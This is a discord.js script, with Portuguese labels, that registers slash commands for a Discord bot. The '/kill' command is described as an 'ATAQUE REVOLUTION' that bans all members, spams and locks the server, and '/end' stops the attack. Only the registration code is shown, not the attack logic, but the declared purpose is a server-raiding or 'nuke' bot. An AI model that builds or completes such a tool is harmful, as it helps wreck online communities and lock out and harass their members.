const { REST, Routes, SlashCommandBuilder } = require('discord.js');
require('dotenv').config();

const commands = [
  new SlashCommandBuilder()
    .setName('kill')
    .setDescription('🔥 ATAQUE REVOLUTION - BAN + SPAM + LOCK (DONO)'),

  new SlashCommandBuilder()
    .setName('end')
    .setDescription('🛑 PARA O ATAQUE REVOLUTION (DONO)')
];

const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

(async () => {
  try {
    console.log('REGISTRANDO COMANDOS REVOLUTION...');
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands.map(cmd => cmd.toJSON()) }
    );
    console.log('COMANDOS REVOLUTION REGISTRADOS!');
    console.log('📱 /kill - Bane todos + Spam + Lock');
    console.log('📱 /end - Para ataque');
  } catch (error) {
    console.error('ERRO:', error);
  }
})();
